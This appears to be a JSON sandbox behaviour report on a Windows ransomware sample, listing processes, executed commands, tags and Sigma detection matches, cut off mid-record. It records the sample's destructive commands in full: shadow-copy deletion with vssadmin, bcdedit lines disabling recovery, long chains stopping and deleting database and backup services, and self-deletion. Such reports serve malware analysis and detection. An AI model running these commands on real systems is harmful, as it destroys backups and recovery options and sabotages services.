{
    "data":  {
                 "services_opened":  [
                                         "LanmanServer",
                                         "MsDtsServer100"
                                     ],
                 "text_highlighted":  [
                                          "vssadmin 1.1 - Volume Shadow Copy Service administ",
                                          "C:\\Windows\\system32\\cmd.exe"
                                      ],
                 "calls_highlighted":  [
                                           "RtlWow64GetCurrentMachine",
                                           "RtlWow64IsWowGuestMachineSupported",
                                           "GetTickCount"
                                       ],
                 "processes_created":  [
                                           "\"C:\\Users\\\u003cUSER\u003e\\Desktop\\file.exe\"",
                                           "\"C:\\Windows\\System32\\cmd.exe\" /c bcdedit /set {current} bootstatuspolicy ignoreallfailures",
                                           "\"C:\\Windows\\sysnative\\vssadmin.exe\"  delete shadows /all /quiet",
                                           "\"C:\\Windows\\System32\\cmd.exe\" /c bcdedit /set {current} recoveryenabled no",
                                           "\"C:\\Windows\\System32\\cmd.exe\" /C sc delete MsDtsServer100\u0026\u0026sc delete MSSQL$SOPHOS\u0026\u0026sc delete MSSQLFDLauncher\u0026\u0026sc delete MSSQLSERVER\u0026\u0026sc delete MSSQLServerADHelper100\u0026\u0026sc delete MSSQLServerOLAPService\u0026\u0026sc delete ReportServer\u0026\u0026sc delete SQLAgent$SOPHOS\u0026\u0026sc delete \"SQLANYs_sem5\"\u0026\u0026sc delete SQLBrowser\u0026\u0026sc delete SQLSERVERAGENT\u0026\u0026sc delete SQLWriter\u0026\u0026sc delete B1LicenseService\u0026\u0026sc delete b1s50000\u0026\u0026sc delete b1s50001\u0026\u0026sc delete b1s50002\u0026\u0026sc delete B1ServerTools\u0026\u0026sc delete B1ServerTools64\u0026\u0026sc delete B1Workflow\u0026\u0026sc delete COMSysApp\u0026\u0026sc delete Gatekeeper64\u0026\u0026sc delete isapnp\u0026\u0026sc delete \"SAP Business One RSP Agent Service\"\u0026\u0026sc delete SBOClientAgent\u0026\u0026sc delete \"SBODI_Server\"\u0026\u0026sc delete SBOMail\u0026\u0026sc delete SBOWFDataAccess\u0026\u0026taskkill /f /im db*\u0026\u0026taskkill /f /im apache*\u0026\u0026taskkill /f /im mysql*\u0026\u0026taskkill /f /im Notifier*\u0026\u0026taskkill /f /im IBM*\u0026\u0026taskkill /f /im copy*\u0026\u0026taskkill /f /im store*\u0026\u0026taskkill /f /im sql*\u0026\u0026taskkill /f /im vee*\u0026\u0026taskkill /f /im wrsa*\u0026\u0026taskkill /f /im postg*\u0026\u0026taskkill /f /im sage*\u0026\u0026taskkill /f /im msdt*\u0026\u0026taskkill /f /im ora*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026taskkill /f /im backup*\u0026\u0026taskkill /f /im http*\u0026\u0026taskkill /f /im office*\u0026\u0026taskkill /f /im cube*\u0026\u0026taskkill /f /im team*\u0026\u0026taskkill /f /im b1*\u0026\u0026taskkill /f /im sbo*\u0026\u0026taskkill /f /im reporting*\u0026\u0026taskkill /f /im sav*\u0026\u0026taskkill /f /im fd*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026net stop MSSQLFDLauncher\u0026\u0026net stop MSSQLServerOLAPService\u0026\u0026net stop ReportServer",
                                           "sc  delete MsDtsServer100",
                                           "C:\\Windows\\system32\\services.exe",
                                           "C:\\Windows\\System32\\svchost.exe -k swprv",
                                           "C:\\Windows\\System32\\bcdedit.exe",
                                           "C:\\Windows\\System32\\sc.exe",
                                           "C:\\Windows\\System32\\cmd.exe",
                                           "C:\\Windows\\sysnative\\vssadmin.exe delete shadows /all /quiet",
                                           "C:\\Windows\\System32\\cmd.exe /c bcdedit /set {current} bootstatuspolicy ignoreallfailures",
                                           "C:\\Windows\\System32\\cmd.exe /C sc delete MsDtsServer100\u0026\u0026sc delete MSSQL$SOPHOS\u0026\u0026sc delete MSSQLFDLauncher\u0026\u0026sc delete MSSQLSERVER\u0026\u0026sc delete MSSQLServerADHelper100\u0026\u0026sc delete MSSQLServerOLAPService\u0026\u0026sc delete ReportServer\u0026\u0026sc delete SQLAgent$SOPHOS\u0026\u0026sc delete SQLANYs_sem5\u0026\u0026sc delete SQLBrowser\u0026\u0026sc delete SQLSERVERAGENT\u0026\u0026sc delete SQLWriter\u0026\u0026sc delete B1LicenseService\u0026\u0026sc delete b1s50000\u0026\u0026sc delete b1s50001\u0026\u0026sc delete b1s50002\u0026\u0026sc delete B1ServerTools\u0026\u0026sc delete B1ServerTools64\u0026\u0026sc delete B1Workflow\u0026\u0026sc delete COMSysApp\u0026\u0026sc delete Gatekeeper64\u0026\u0026sc delete isapnp\u0026\u0026sc delete SAP Business One RSP Agent Service\u0026\u0026sc delete SBOClientAgent\u0026\u0026sc delete SBODI_Server\u0026\u0026sc delete SBOMail\u0026\u0026sc delete SBOWFDataAccess\u0026\u0026taskkill /f /im db*\u0026\u0026taskkill /f /im apache*\u0026\u0026taskkill /f /im mysql*\u0026\u0026taskkill /f /im Notifier*\u0026\u0026taskkill /f /im IBM*\u0026\u0026taskkill /f /im copy*\u0026\u0026taskkill /f /im store*\u0026\u0026taskkill /f /im sql*\u0026\u0026taskkill /f /im vee*\u0026\u0026taskkill /f /im wrsa*\u0026\u0026taskkill /f /im postg*\u0026\u0026taskkill /f /im sage*\u0026\u0026taskkill /f /im msdt*\u0026\u0026taskkill /f /im ora*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026taskkill /f /im backup*\u0026\u0026taskkill /f /im http*\u0026\u0026taskkill /f /im office*\u0026\u0026taskkill /f /im cube*\u0026\u0026taskkill /f /im team*\u0026\u0026taskkill /f /im b1*\u0026\u0026taskkill /f /im sbo*\u0026\u0026taskkill /f /im reporting*\u0026\u0026taskkill /f /im sav*\u0026\u0026taskkill /f /im fd*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026net stop MSSQLFDLauncher\u0026\u0026net stop MSSQLServerOLAPService\u0026\u0026net stop ReportServer",
                                           "C:\\Windows\\System32\\cmd.exe /c bcdedit /set {current} recoveryenabled no",
                                           "sc delete MsDtsServer100"
                                       ],
                 "services_started":  [
                                          "VSS",
                                          "swprv",
                                          "WSearch",
                                          "SecurityHealthService"
                                      ],
                 "command_executions":  [
                                            "\"%ComSpec%\" /C sc delete MsDtsServer100\u0026\u0026sc delete MSSQL$SOPHOS\u0026\u0026sc delete MSSQLFDLauncher\u0026\u0026sc delete MSSQLSERVER\u0026\u0026sc delete MSSQLServerADHelper100\u0026\u0026sc delete MSSQLServerOLAPService\u0026\u0026sc delete ReportServer\u0026\u0026sc delete SQLAgent$SOPHOS\u0026\u0026sc delete \"SQLANYs_sem5\"\u0026\u0026sc delete SQLBrowser\u0026\u0026sc delete SQLSERVERAGENT\u0026\u0026sc delete SQLWriter\u0026\u0026sc delete B1LicenseService\u0026\u0026sc delete b1s50000\u0026\u0026sc delete b1s50001\u0026\u0026sc delete b1s50002\u0026\u0026sc delete B1ServerTools\u0026\u0026sc delete B1ServerTools64\u0026\u0026sc delete B1Workflow\u0026\u0026sc delete COMSysApp\u0026\u0026sc delete Gatekeeper64\u0026\u0026sc delete isapnp\u0026\u0026sc delete \"SAP Business One RSP Agent Service\"\u0026\u0026sc delete SBOClientAgent\u0026\u0026sc delete \"SBODI_Server\"\u0026\u0026sc delete SBOMail\u0026\u0026sc delete SBOWFDataAccess\u0026\u0026taskkill /f /im db*\u0026\u0026taskkill /f /im apache*\u0026\u0026taskkill /f /im mysql*\u0026\u0026taskkill /f /im Notifier*\u0026\u0026taskkill /f /im IBM*\u0026\u0026taskkill /f /im copy*\u0026\u0026taskkill /f /im store*\u0026\u0026taskkill /f /im sql*\u0026\u0026taskkill /f /im vee*\u0026\u0026taskkill /f /im wrsa*\u0026\u0026taskkill /f /im postg*\u0026\u0026taskkill /f /im sage*\u0026\u0026taskkill /f /im msdt*\u0026\u0026taskkill /f /im ora*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026taskkill /f /im backup*\u0026\u0026taskkill /f /im http*\u0026\u0026taskkill /f /im office*\u0026\u0026taskkill /f /im cube*\u0026\u0026taskkill /f /im team*\u0026\u0026taskkill /f /im b1*\u0026\u0026taskkill /f /im sbo*\u0026\u0026taskkill /f /im reporting*\u0026\u0026taskkill /f /im sav*\u0026\u0026taskkill /f /im fd*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026net stop MSSQLFDLauncher\u0026\u0026net stop MSSQLServerOLAPService\u0026\u0026net stop ReportServer",
                                            "sc  delete MsDtsServer100",
                                            "\"%ComSpec%\" /c bcdedit /set {current} recoveryenabled no",
                                            "\"%windir%\\sysnative\\vssadmin.exe\"  delete shadows /all /quiet",
                                            "\"%ComSpec%\" /c bcdedit /set {current} bootstatuspolicy ignoreallfailures",
                                            "\"C:\\Windows\\sysnative\\vssadmin.exe\"  delete shadows /all /quiet",
                                            "\"C:\\Windows\\System32\\cmd.exe\" /c bcdedit /set {current} bootstatuspolicy ignoreallfailures",
                                            "cmd.exe /c bcdedit /set {current} bootstatuspolicy ignoreallfailures",
                                            "\"C:\\Windows\\System32\\cmd.exe\" /c bcdedit /set {current} recoveryenabled no",
                                            "cmd.exe /c bcdedit /set {current} recoveryenabled no",
                                            "\"C:\\Windows\\System32\\cmd.exe\" /C sc delete MsDtsServer100\u0026\u0026sc delete MSSQL$SOPHOS\u0026\u0026sc delete MSSQLFDLauncher\u0026\u0026sc delete MSSQLSERVER\u0026\u0026sc delete MSSQLServerADHelper100\u0026\u0026sc delete MSSQLServerOLAPService\u0026\u0026sc delete ReportServer\u0026\u0026sc delete SQLAgent$SOPHOS\u0026\u0026sc delete \"SQLANYs_sem5\"\u0026\u0026sc delete SQLBrowser\u0026\u0026sc delete SQLSERVERAGENT\u0026\u0026sc delete SQLWriter\u0026\u0026sc delete B1LicenseService\u0026\u0026sc delete b1s50000\u0026\u0026sc delete b1s50001\u0026\u0026sc delete b1s50002\u0026\u0026sc delete B1ServerTools\u0026\u0026sc delete B1ServerTools64\u0026\u0026sc delete B1Workflow\u0026\u0026sc delete COMSysApp\u0026\u0026sc delete Gatekeeper64\u0026\u0026sc delete isapnp\u0026\u0026sc delete \"SAP Business One RSP Agent Service\"\u0026\u0026sc delete SBOClientAgent\u0026\u0026sc delete \"SBODI_Server\"\u0026\u0026sc delete SBOMail\u0026\u0026sc delete SBOWFDataAccess\u0026\u0026taskkill /f /im db*\u0026\u0026taskkill /f /im apache*\u0026\u0026taskkill /f /im mysql*\u0026\u0026taskkill /f /im Notifier*\u0026\u0026taskkill /f /im IBM*\u0026\u0026taskkill /f /im copy*\u0026\u0026taskkill /f /im store*\u0026\u0026taskkill /f /im sql*\u0026\u0026taskkill /f /im vee*\u0026\u0026taskkill /f /im wrsa*\u0026\u0026taskkill /f /im postg*\u0026\u0026taskkill /f /im sage*\u0026\u0026taskkill /f /im msdt*\u0026\u0026taskkill /f /im ora*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026taskkill /f /im backup*\u0026\u0026taskkill /f /im http*\u0026\u0026taskkill /f /im office*\u0026\u0026taskkill /f /im cube*\u0026\u0026taskkill /f /im team*\u0026\u0026taskkill /f /im b1*\u0026\u0026taskkill /f /im sbo*\u0026\u0026taskkill /f /im reporting*\u0026\u0026taskkill /f /im sav*\u0026\u0026taskkill /f /im fd*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026net stop MSSQLFDLauncher\u0026\u0026net stop MSSQLServerOLAPService\u0026\u0026net stop ReportServer",
                                            "cmd.exe /C sc delete MsDtsServer100\u0026\u0026sc delete MSSQL$SOPHOS\u0026\u0026sc delete MSSQLFDLauncher\u0026\u0026sc delete MSSQLSERVER\u0026\u0026sc delete MSSQLServerADHelper100\u0026\u0026sc delete MSSQLServerOLAPService\u0026\u0026sc delete ReportServer\u0026\u0026sc delete SQLAgent$SOPHOS\u0026\u0026sc delete \"SQLANYs_sem5\"\u0026\u0026sc delete SQLBrowser\u0026\u0026sc delete SQLSERVERAGENT\u0026\u0026sc delete SQLWriter\u0026\u0026sc delete B1LicenseService\u0026\u0026sc delete b1s50000\u0026\u0026sc delete b1s50001\u0026\u0026sc delete b1s50002\u0026\u0026sc delete B1ServerTools\u0026\u0026sc delete B1ServerTools64\u0026\u0026sc delete B1Workflow\u0026\u0026sc delete COMSysApp\u0026\u0026sc delete Gatekeeper64\u0026\u0026sc delete isapnp\u0026\u0026sc delete \"SAP Business One RSP Agent Service\"\u0026\u0026sc delete SBOClientAgent\u0026\u0026sc delete \"SBODI_Server\"\u0026\u0026sc delete SBOMail\u0026\u0026sc delete SBOWFDataAccess\u0026\u0026taskkill /f /im db*\u0026\u0026taskkill /f /im apache*\u0026\u0026taskkill /f /im mysql*\u0026\u0026taskkill /f /im Notifier*\u0026\u0026taskkill /f /im IBM*\u0026\u0026taskkill /f /im copy*\u0026\u0026taskkill /f /im store*\u0026\u0026taskkill /f /im sql*\u0026\u0026taskkill /f /im vee*\u0026\u0026taskkill /f /im wrsa*\u0026\u0026taskkill /f /im postg*\u0026\u0026taskkill /f /im sage*\u0026\u0026taskkill /f /im msdt*\u0026\u0026taskkill /f /im ora*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026taskkill /f /im backup*\u0026\u0026taskkill /f /im http*\u0026\u0026taskkill /f /im office*\u0026\u0026taskkill /f /im cube*\u0026\u0026taskkill /f /im team*\u0026\u0026taskkill /f /im b1*\u0026\u0026taskkill /f /im sbo*\u0026\u0026taskkill /f /im reporting*\u0026\u0026taskkill /f /im sav*\u0026\u0026taskkill /f /im fd*\u0026\u0026taskkill /f /im microsoft*\u0026\u0026net stop MSSQLFDLauncher\u0026\u0026net stop MSSQLServerOLAPService\u0026\u0026net stop ReportServer",
                                            "\"C:\\Windows\\System32\\cmd.exe\" /c ping 127.0.0.1 \u0026\u0026 del \"C:\\Users\\\u003cUSER\u003e\\Desktop\\file.exe\" \u003e\u003e NUL",
                                            "cmd.exe /c ping 127.0.0.1 \u0026\u0026 del \"C:\\Users\\\u003cUSER\u003e\\Desktop\\file.exe\" \u003e\u003e NUL",
                                            "C:\\Windows\\System32\\svchost.exe -k swprv",
                                            "C:\\Windows\\System32\\svchost.exe -k LocalService -p -s LicenseManager",
                                            "bcdedit  /set {current} bootstatuspolicy ignoreallfailures",
                                            "\\??\\C:\\Windows\\system32\\conhost.exe",
                                            "bcdedit  /set {current} recoveryenabled no",
                                            "\"C:\\Windows\\System32\\cmd.exe\" /C sc delete MsDtsServer100\u0026\u0026sc delete MSSQL$SOPHOS\u0026\u0026sc delete MSSQLFDLauncher\u0026\u0026sc delete MSSQLSERVER\u0026\u0026sc delete MSSQLServerADHelper100\u0026\u0026sc delete MSSQLServerOLAPService\u0026\u0026sc delete ReportServer\u0026\u0026sc delete SQLAgent$SOPHOS\u0026\u0026sc delete \"SQLANYs_sem5\"\u0026\u0026sc delete SQLBrowser\u0026\u0026sc delete SQLSERVERAGENT\u0026\u0026sc delete SQLWriter\u0026\u0026sc delete B1LicenseService\u0026\u0026sc delete b1s50000\u0026\u0026sc delete b1s50001\u0026\u0026sc delete b1s50002\u0026\u0026sc delete B1ServerTools\u0026\u0026sc delete B1ServerTools64\u0026\u0026sc delete B1Workflow\u0026\u0026sc delete COMSysApp\u0026\u0026sc delete Gatekeeper64\u0026\u0026sc delete isapnp\u0026\u0026sc delete \"SAP Business One RSP Agent Service\"\u0026\u0026sc delete SBOClientAgent\u0026\u0026sc delete \"SBODI_Server\"\u0026\u0026sc delete SBOMail\u0026\u0026sc delete SBOWFDataAccess\u0026\u0026taskkill /f /im db*\u0026\u0026taskkill /f /im apache*\u0026\u0026taskkill /f /im mysql*\u0026\u0026taskkill /f /im Notifier*\u0026\u0026taskkill /f /im IBM*\u0026\u0026taskkill /f /im copy*\u0026\u0026taskkill /f /im store*\u0026\u0026taskkill /f /im sql*\u0026\u0026taskkill /f /im vee*\u0026\u0026taskkill /f /im wrsa*\u0026\u0026taskkill /f /im postg*\u0026\u0026taskkill /f /im sage*\u0026\u0026taskkill /f /im msdt*\u0026\u0026ta",
                                            " ",
                                            "C:\\Windows\\sysnative\\vssadmin.exe  delete shadows /all /quiet"
                                        ],
                 "verdicts":  [
                                  "MALWARE",
                                  "RANSOM",
                                  "TROJAN",
                                  "EVADER"
                              ],
                 "tags":  [
                              "OBFUSCATED",
                              "CRYPTO",
                              "DIRECT_CPU_CLOCK_ACCESS",
                              "RUNTIME_MODULES",
                              "CHECKS_USB_BUS",
                              "DETECT_DEBUG_ENVIRONMENT"
                          ],
                 "sigma_analysis_results":  [
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "70905",
                                                                                             "OriginalFileName":  "VSSADMIN.EXE",
                                                                                             "UtcTime":  "2022-07-20 18:12:26.437",
                                                                                             "Description":  "Command Line Interface for Microsoft® Volume Shadow Copy Service ",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=E23DD973E1444684EB36365DEFF1FC74,SHA256=4DE7FA20E3224382D8C4A81017E5BDD4673AFBEF9C0F017E203D7B78977FBF8C,IMPHASH=73C7E7BEA64A545CFCA4BEC56EAAAE92",
                                                                                             "ParentImage":  "C:\\Users\\admin\\Downloads\\ac1a255e5c908f12ef68a45fc0043b16.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\vssadmin.exe",
                                                                                             "ParentProcessId":  "2376",
                                                                                             "ParentProcessGuid":  "5240FBE6-4584-62D8-9800-000000002400",
                                                                                             "Product":  "Microsoft® Windows® Operating System",
                                                                                             "LogonGuid":  "5240FBE6-4505-62D8-F914-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-458A-62D8-9D00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\sysnative\\vssadmin.exe\"  delete shadows /all /quiet",
                                                                                             "ParentCommandLine":  "\"ac1a255e5c908f12ef68a45fc0043b16.exe\"",
                                                                                             "ProcessId":  "2680",
                                                                                             "FileVersion":  "6.1.7600.16385 (win7_rtm.090713-1255)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "-",
                                                                                             "CurrentDirectory":  "C:\\Users\\admin\\Downloads\\",
                                                                                             "LogonId":  "70905",
                                                                                             "OriginalFileName":  "VSSADMIN.EXE",
                                                                                             "UtcTime":  "2022-07-20 18:12:26.437",
                                                                                             "Description":  "Command Line Interface for Microsoft® Volume Shadow Copy Service ",
                                                                                             "User":  "work\\admin",
                                                                                             "Hashes":  "MD5=E23DD973E1444684EB36365DEFF1FC74,SHA256=4DE7FA20E3224382D8C4A81017E5BDD4673AFBEF9C0F017E203D7B78977FBF8C,IMPHASH=73C7E7BEA64A545CFCA4BEC56EAAAE92",
                                                                                             "ParentImage":  "C:\\Users\\admin\\Downloads\\ac1a255e5c908f12ef68a45fc0043b16.exe",
                                                                                             "IntegrityLevel":  "High",
                                                                                             "TerminalSessionId":  "1",
                                                                                             "Image":  "C:\\Windows\\System32\\vssadmin.exe",
                                                                                             "ParentProcessId":  "2376",
                                                                                             "ParentProcessGuid":  "5240FBE6-4584-62D8-9800-000000002400",
                                                                                             "Product":  "Microsoft® Windows® Operating System",
                                                                                             "LogonGuid":  "5240FBE6-4505-62D8-F914-010000000000",
                                                                                             "EventID":  "1",
                                                                                             "ProcessGuid":  "5240FBE6-458A-62D8-9D00-000000002400",
                                                                                             "CommandLine":  "\"C:\\Windows\\sysnative\\vssadmin.exe\"  delete shadows /all /quiet",
                                                                                             "ParentCommandLine":  "\"ac1a255e5c908f12ef68a45fc0043b16.exe\"",
                                                                                             "ProcessId":  "2680",
                                                                                             "FileVersion":  "6.1.7600.16385 (win7_rtm.090713-1255)",
                                                                                             "Company":  "Microsoft Corporation"
                                                                                         }
                                                                          }
                                                                      ],
                                                    "rule_level":  "high",
                                                    "rule_id":  "ad5e4d4b939797a70a9aa742d979a4742c2cfedddd663fb1a43b2795c1e6054b",
                                                    "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                    "rule_title":  "Shadow Copies Deletion Using Operating Systems Utilities",
                                                    "rule_description":  "Shadow Copies deletion using operating systems utilities",
                                                    "rule_author":  "Florian Roth, Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)"
                                                },
                                                {
                                                    "match_context":  [
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "12345",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "udp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:14.173",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Initiated":  "true",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "255.255.255.255",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "55069",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:29.194",
                                                                                             "RuleName":  "Usermode",
                                                                                             "SourceHostname":  "-",
                                                                                             "DestinationHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49169",
                                                                                             "DestinationIp":  "142.251.107.153"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:30.038",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Initiated":  "true",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "142.251.107.153",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49172",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:36.600",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Initiated":  "true",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "142.251.107.153",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49182",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:38.497",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Initiated":  "true",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "142.251.107.153",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49184",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:43.735",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationIp":  "142.251.107.153",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49225",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:44.317",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "Initiated":  "true",
                                                                                             "SourceHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "142.251.107.153",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49226",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "DestinationPort":  "443",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "tcp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:53.238",
                                                                                             "RuleName":  "Usermode",
                                                                                             "SourceHostname":  "-",
                                                                                             "DestinationHostname":  "-",
                                                                                             "SourcePortName":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "49229",
                                                                                             "DestinationIp":  "142.251.107.153"
                                                                                         }
                                                                          },
                                                                          {
                                                                              "values":  {
                                                                                             "RuleName":  "Usermode",
                                                                                             "DestinationPort":  "12345",
                                                                                             "User":  "work\\admin",
                                                                                             "Protocol":  "udp",
                                                                                             "SourceIp":  "192.168.122.10",
                                                                                             "DestinationIsIpv6":  "false",
                                                                                             "DestinationPortName":  "-",
                                                                                             "UtcTime":  "2022-07-20 18:12:14.173",
                                                                                             "SourceIsIpv6":  "false",
                                                                                             "SourceHostname":  "-",
                                                                                             "Initiated":  "true",
                                                                                             "SourcePortName":  "-",
                                                                                             "DestinationIp":  "255.255.255.255",
                                                                                             "Image":  "C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe",
                                                                                             "EventID":  "3",
                                                                                             "ProcessGuid":  "5240FBE6-4573-62D8-3B00-000000002400",
                                                                                             "ProcessId":  "716",
                                                                                             "SourcePort":  "55069",
                                                                                             "DestinationHostname":  "-"
                                                                                         }
                                                                          },
